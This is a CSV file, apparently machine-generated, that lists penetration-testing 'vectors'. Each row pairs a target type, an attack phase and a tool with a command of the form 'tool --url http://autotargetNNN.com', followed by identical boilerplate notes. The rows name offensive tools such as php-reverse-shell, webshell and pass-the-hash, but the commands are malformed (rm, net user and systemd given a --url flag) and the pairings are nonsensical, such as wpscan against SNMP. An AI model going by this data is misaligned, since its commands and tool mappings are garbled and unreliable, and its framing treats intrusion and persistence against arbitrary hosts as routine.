target_type,subtype,phase,tool,command,notes
WebApp,WordPress,Scanning,del,del --url http://autotarget171.com,"This vector uses del during the scanning phase against a WordPress application. It targets http://autotarget171.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Reconnaissance,dnsrecon,dnsrecon --url http://autotarget172.com,"This vector uses dnsrecon during the reconnaissance phase against a General application. It targets http://autotarget172.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Enumeration,net user,net user --url http://autotarget173.com,"This vector uses net user during the enumeration phase against a Laravel application. It targets http://autotarget173.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Enumeration,config-tampering,config-tampering --url http://autotarget174.com,"This vector uses config-tampering during the enumeration phase against a FTP application. It targets http://autotarget174.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Scanning,systemd,systemd --url http://autotarget175.com,"This vector uses systemd during the scanning phase against a General application. It targets http://autotarget175.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Privilege Escalation,config-tampering,config-tampering --url http://autotarget176.com,"This vector uses config-tampering during the privilege escalation phase against a Laravel application. It targets http://autotarget176.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Exploitation,nmap,nmap --url http://autotarget177.com,"This vector uses nmap during the exploitation phase against a Joomla application. It targets http://autotarget177.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Persistence,cronjob,cronjob --url http://autotarget178.com,"This vector uses cronjob during the persistence phase against a Drupal application. It targets http://autotarget178.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Reconnaissance,gobuster,gobuster --url http://autotarget179.com,"This vector uses gobuster during the reconnaissance phase against a Drupal application. It targets http://autotarget179.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Post Exploitation,authorized_keys,authorized_keys --url http://autotarget180.com,"This vector uses authorized_keys during the post exploitation phase against a SNMP application. It targets http://autotarget180.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Enumeration,wpscan,wpscan --url http://autotarget181.com,"This vector uses wpscan during the enumeration phase against a Magento application. It targets http://autotarget181.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Exploitation,sudo-l,sudo-l --url http://autotarget182.com,"This vector uses sudo-l during the exploitation phase against a Magento application. It targets http://autotarget182.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Persistence,net user,net user --url http://autotarget183.com,"This vector uses net user during the persistence phase against a ASP.NET application. It targets http://autotarget183.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Persistence,webshell,webshell --url http://autotarget184.com,"This vector uses webshell during the persistence phase against a WordPress application. It targets http://autotarget184.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Privilege Escalation,browser-exploit,browser-exploit --url http://autotarget185.com,"This vector uses browser-exploit during the privilege escalation phase against a ASP.NET application. It targets http://autotarget185.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Cleanup,amass,amass --url http://autotarget186.com,"This vector uses amass during the cleanup phase against a Joomla application. It targets http://autotarget186.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Scanning,laravel-expose,laravel-expose --url http://autotarget187.com,"This vector uses laravel-expose during the scanning phase against a General application. It targets http://autotarget187.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Persistence,env-vars,env-vars --url http://autotarget188.com,"This vector uses env-vars during the persistence phase against a General application. It targets http://autotarget188.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,FTP,Post Exploitation,enum4linux,enum4linux --url http://autotarget189.com,"This vector uses enum4linux during the post exploitation phase against a FTP application. It targets http://autotarget189.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Persistence,sticky-keys,sticky-keys --url http://autotarget190.com,"This vector uses sticky-keys during the persistence phase against a Node.js application. It targets http://autotarget190.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Scanning,rm,rm --url http://autotarget191.com,"This vector uses rm during the scanning phase against a WordPress application. It targets http://autotarget191.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Exploitation,drupwn,drupwn --url http://autotarget192.com,"This vector uses drupwn during the exploitation phase against a General application. It targets http://autotarget192.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Persistence,sublist3r,sublist3r --url http://autotarget193.com,"This vector uses sublist3r during the persistence phase against a Laravel application. It targets http://autotarget193.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Reconnaissance,at,at --url http://autotarget194.com,"This vector uses at during the reconnaissance phase against a Node.js application. It targets http://autotarget194.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Enumeration,sqlmap,sqlmap --url http://autotarget195.com,"This vector uses sqlmap during the enumeration phase against a ASP.NET application. It targets http://autotarget195.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Cleanup,config-leak,config-leak --url http://autotarget196.com,"This vector uses config-leak during the cleanup phase against a PHP application. It targets http://autotarget196.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Exploitation,env-vars,env-vars --url http://autotarget197.com,"This vector uses env-vars during the exploitation phase against a Joomla application. It targets http://autotarget197.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Enumeration,onesixtyone,onesixtyone --url http://autotarget198.com,"This vector uses onesixtyone during the enumeration phase against a Magento application. It targets http://autotarget198.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Privilege Escalation,snmpwalk,snmpwalk --url http://autotarget199.com,"This vector uses snmpwalk during the privilege escalation phase against a General application. It targets http://autotarget199.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Cleanup,net user,net user --url http://autotarget200.com,"This vector uses net user during the cleanup phase against a General application. It targets http://autotarget200.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Post Exploitation,nmap,nmap --url http://autotarget201.com,"This vector uses nmap during the post exploitation phase against a SMB application. It targets http://autotarget201.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Scanning,php-reverse-shell,php-reverse-shell --url http://autotarget202.com,"This vector uses php-reverse-shell during the scanning phase against a WordPress application. It targets http://autotarget202.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Enumeration,net user,net user --url http://autotarget203.com,"This vector uses net user during the enumeration phase against a Joomla application. It targets http://autotarget203.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Privilege Escalation,sublist3r,sublist3r --url http://autotarget204.com,"This vector uses sublist3r during the privilege escalation phase against a General application. It targets http://autotarget204.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Exploitation,ssh-keyscan,ssh-keyscan --url http://autotarget205.com,"This vector uses ssh-keyscan during the exploitation phase against a Joomla application. It targets http://autotarget205.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Scanning,wpscan,wpscan --url http://autotarget206.com,"This vector uses wpscan during the scanning phase against a SNMP application. It targets http://autotarget206.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Persistence,systemctl,systemctl --url http://autotarget207.com,"This vector uses systemctl during the persistence phase against a Magento application. It targets http://autotarget207.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Laravel,Privilege Escalation,pm2,pm2 --url http://autotarget208.com,"This vector uses pm2 during the privilege escalation phase against a Laravel application. It targets http://autotarget208.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Scanning,ftp,ftp --url http://autotarget209.com,"This vector uses ftp during the scanning phase against a Node.js application. It targets http://autotarget209.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Exploitation,php-reverse-shell,php-reverse-shell --url http://autotarget210.com,"This vector uses php-reverse-shell during the exploitation phase against a Magento application. It targets http://autotarget210.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Enumeration,nslookup,nslookup --url http://autotarget211.com,"This vector uses nslookup during the enumeration phase against a General application. It targets http://autotarget211.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Scanning,artisan-command,artisan-command --url http://autotarget212.com,"This vector uses artisan-command during the scanning phase against a Joomla application. It targets http://autotarget212.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Exploitation,cronjob,cronjob --url http://autotarget213.com,"This vector uses cronjob during the exploitation phase against a Drupal application. It targets http://autotarget213.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Magento,Persistence,dnsrecon,dnsrecon --url http://autotarget214.com,"This vector uses dnsrecon during the persistence phase against a Magento application. It targets http://autotarget214.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Reconnaissance,find,find --url http://autotarget215.com,"This vector uses find during the reconnaissance phase against a WordPress application. It targets http://autotarget215.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Persistence,proxychains,proxychains --url http://autotarget216.com,"This vector uses proxychains during the persistence phase against a Drupal application. It targets http://autotarget216.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Exploitation,pass-the-hash,pass-the-hash --url http://autotarget217.com,"This vector uses pass-the-hash during the exploitation phase against a SMB application. It targets http://autotarget217.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Exploitation,msfconsole,msfconsole --url http://autotarget218.com,"This vector uses msfconsole during the exploitation phase against a PHP application. It targets http://autotarget218.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Persistence,webshell,webshell --url http://autotarget219.com,"This vector uses webshell during the persistence phase against a General application. It targets http://autotarget219.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Scanning,ssh-keyscan,ssh-keyscan --url http://autotarget220.com,"This vector uses ssh-keyscan during the scanning phase against a General application. It targets http://autotarget220.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Persistence,xss,xss --url http://autotarget221.com,"This vector uses xss during the persistence phase against a SMB application. It targets http://autotarget221.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Privilege Escalation,dirsearch,dirsearch --url http://autotarget222.com,"This vector uses dirsearch during the privilege escalation phase against a RDP application. It targets http://autotarget222.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Reconnaissance,env-vars,env-vars --url http://autotarget223.com,"This vector uses env-vars during the reconnaissance phase against a SMB application. It targets http://autotarget223.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SMB,Enumeration,exploit-db,exploit-db --url http://autotarget224.com,"This vector uses exploit-db during the enumeration phase against a SMB application. It targets http://autotarget224.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,WordPress,Post Exploitation,ftp,ftp --url http://autotarget225.com,"This vector uses ftp during the post exploitation phase against a WordPress application. It targets http://autotarget225.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Reconnaissance,authorized_keys,authorized_keys --url http://autotarget226.com,"This vector uses authorized_keys during the reconnaissance phase against a ASP.NET application. It targets http://autotarget226.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Exploitation,proxychains,proxychains --url http://autotarget227.com,"This vector uses proxychains during the exploitation phase against a Joomla application. It targets http://autotarget227.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,RDP,Post Exploitation,env-vars,env-vars --url http://autotarget228.com,"This vector uses env-vars during the post exploitation phase against a RDP application. It targets http://autotarget228.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,PHP,Privilege Escalation,hydra,hydra --url http://autotarget229.com,"This vector uses hydra during the privilege escalation phase against a PHP application. It targets http://autotarget229.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Enumeration,env-vars,env-vars --url http://autotarget230.com,"This vector uses env-vars during the enumeration phase against a General application. It targets http://autotarget230.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,ASP.NET,Enumeration,xss,xss --url http://autotarget231.com,"This vector uses xss during the enumeration phase against a ASP.NET application. It targets http://autotarget231.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Drupal,Scanning,sublist3r,sublist3r --url http://autotarget232.com,"This vector uses sublist3r during the scanning phase against a Drupal application. It targets http://autotarget232.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Persistence,dnsrecon,dnsrecon --url http://autotarget233.com,"This vector uses dnsrecon during the persistence phase against a General application. It targets http://autotarget233.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Exploitation,ssh-keyscan,ssh-keyscan --url http://autotarget234.com,"This vector uses ssh-keyscan during the exploitation phase against a SNMP application. It targets http://autotarget234.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Joomla,Cleanup,ncrack,ncrack --url http://autotarget235.com,"This vector uses ncrack during the cleanup phase against a Joomla application. It targets http://autotarget235.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,Node.js,Privilege Escalation,restore-template,restore-template --url http://autotarget236.com,"This vector uses restore-template during the privilege escalation phase against a Node.js application. It targets http://autotarget236.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,General,Persistence,template-injection,template-injection --url http://autotarget237.com,"This vector uses template-injection during the persistence phase against a General application. It targets http://autotarget237.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
Network,SNMP,Post Exploitation,sticky-keys,sticky-keys --url http://autotarget238.com,"This vector uses sticky-keys during the post exploitation phase against a SNMP application. It targets http://autotarget238.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
WebApp,General,Post Exploitation,restore-template,restore-template --url http://autotarget239.com,"This vector uses restore-template during the post exploitation phase against a General application. It targets http://autotarget239.com, and is intended to enumerate, exploit, or secure the given endpoint. Ensure that each execution is carefully monitored and any findings are documented, as results may include sensitive data, misconfigurations, or exploitable flaws unique to this web application subtype. For best results, review manual and automated outputs for anomalies, and follow up with post-exploitation cleanup or persistence as necessary."
